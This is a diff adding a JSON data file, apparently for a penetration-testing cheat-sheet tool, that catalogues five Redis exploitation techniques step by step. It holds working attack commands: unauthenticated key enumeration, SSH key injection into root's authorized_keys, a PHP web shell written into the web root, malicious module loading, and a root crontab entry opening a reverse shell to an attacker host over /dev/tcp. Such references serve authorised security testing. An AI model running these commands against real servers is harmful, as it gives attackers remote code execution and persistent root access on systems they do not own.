@@ -1,0 +1,185 @@
+{
+    "name": "Redis - In-Memory Database",
+    "port": 6379,
+    "description": "Redis in-memory key-value store exploitation",
+    "icon": "🔴",
+    "techniques": [
+        {
+            "id": "redis-1",
+            "name": "Unauthenticated Access",
+            "difficulty": "Beginner",
+            "description": "Connect to Redis without authentication",
+            "steps": [
+                "Connect to Redis service",
+                "Check for authentication requirement",
+                "Enumerate data"
+            ],
+            "commands": [
+                {
+                    "tool": "redis-cli",
+                    "command": "redis-cli -h <target_ip>",
+                    "description": "Connect to Redis"
+                },
+                {
+                    "tool": "INFO",
+                    "command": "INFO",
+                    "description": "Get Redis server information"
+                },
+                {
+                    "tool": "KEYS",
+                    "command": "KEYS *",
+                    "description": "List all keys"
+                }
+            ],
+            "tips": [
+                "Many Redis instances have no password",
+                "Check for sensitive data in keys"
+            ]
+        },
+        {
+            "id": "redis-2",
+            "name": "SSH Key Injection",
+            "difficulty": "Intermediate",
+            "description": "Write SSH public key to gain shell access",
+            "steps": [
+                "Generate SSH key pair",
+                "Write public key to Redis",
+                "Configure to save to authorized_keys",
+                "Connect via SSH"
+            ],
+            "commands": [
+                {
+                    "tool": "Generate Key",
+                    "command": "ssh-keygen -t rsa -f redis_rsa",
+                    "description": "Generate SSH key pair"
+                },
+                {
+                    "tool": "Set Key",
+                    "command": "SET ssh_key \"\\n\\nssh-rsa AAAA...your_key...\\n\\n\"",
+                    "description": "Store SSH key in Redis"
+                },
+                {
+                    "tool": "Config DIR",
+                    "command": "CONFIG SET dir /root/.ssh/",
+                    "description": "Set save directory"
+                },
+                {
+                    "tool": "Config File",
+                    "command": "CONFIG SET dbfilename authorized_keys",
+                    "description": "Set filename"
+                },
+                {
+                    "tool": "Save",
+                    "command": "SAVE",
+                    "description": "Save to disk"
+                }
+            ],
+            "tips": [
+                "Requires Redis running as root",
+                "Need write access to /root/.ssh/"
+            ]
+        },
+        {
+            "id": "redis-3",
+            "name": "Web Shell via Redis",
+            "difficulty": "Intermediate",
+            "description": "Write web shell through Redis to web directory",
+            "steps": [
+                "Identify web root path",
+                "Write PHP shell to Redis",
+                "Configure save location",
+                "Access web shell"
+            ],
+            "commands": [
+                {
+                    "tool": "Set Webshell",
+                    "command": "SET shell \"<?php system($_GET['cmd']); ?>\"",
+                    "description": "Store web shell"
+                },
+                {
+                    "tool": "Config DIR",
+                    "command": "CONFIG SET dir /var/www/html/",
+                    "description": "Set web directory"
+                },
+                {
+                    "tool": "Config File",
+                    "command": "CONFIG SET dbfilename shell.php",
+                    "description": "Set PHP filename"
+                },
+                {
+                    "tool": "Save",
+                    "command": "SAVE",
+                    "description": "Write file to disk"
+                }
+            ],
+            "tips": [
+                "Need to know web server path",
+                "Works if Redis can write to web directory"
+            ]
+        },
+        {
+            "id": "redis-4",
+            "name": "Lua Script Execution",
+            "difficulty": "Advanced",
+            "description": "Execute Lua scripts for command execution",
+            "steps": [
+                "Check if EVAL is enabled",
+                "Craft Lua script for RCE",
+                "Execute script"
+            ],
+            "commands": [
+                {
+                    "tool": "EVAL",
+                    "command": "EVAL \"return redis.call('INFO')\" 0",
+                    "description": "Test Lua execution"
+                },
+                {
+                    "tool": "Module Load",
+                    "command": "MODULE LOAD /path/to/module.so",
+                    "description": "Load malicious module"
+                }
+            ],
+            "tips": [
+                "Lua sandbox may limit functionality",
+                "Redis modules can provide RCE"
+            ]
+        },
+        {
+            "id": "redis-5",
+            "name": "Crontab Injection",
+            "difficulty": "Intermediate",
+            "description": "Write cron job for persistent access",
+            "steps": [
+                "Craft reverse shell cron entry",
+                "Write to cron directory",
+                "Wait for execution"
+            ],
+            "commands": [
+                {
+                    "tool": "Set Cron",
+                    "command": "SET cron \"\\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n\"",
+                    "description": "Store cron job"
+                },
+                {
+                    "tool": "Config DIR",
+                    "command": "CONFIG SET dir /var/spool/cron/",
+                    "description": "Set cron directory"
+                },
+                {
+                    "tool": "Config File",
+                    "command": "CONFIG SET dbfilename root",
+                    "description": "Set as root's crontab"
+                },
+                {
+                    "tool": "Save",
+                    "command": "SAVE",
+                    "description": "Write to disk"
+                }
+            ],
+            "tips": [
+                "Cron path varies by OS",
+                "Provides persistent reverse shell"
+            ]
+        }
+    ]
+}
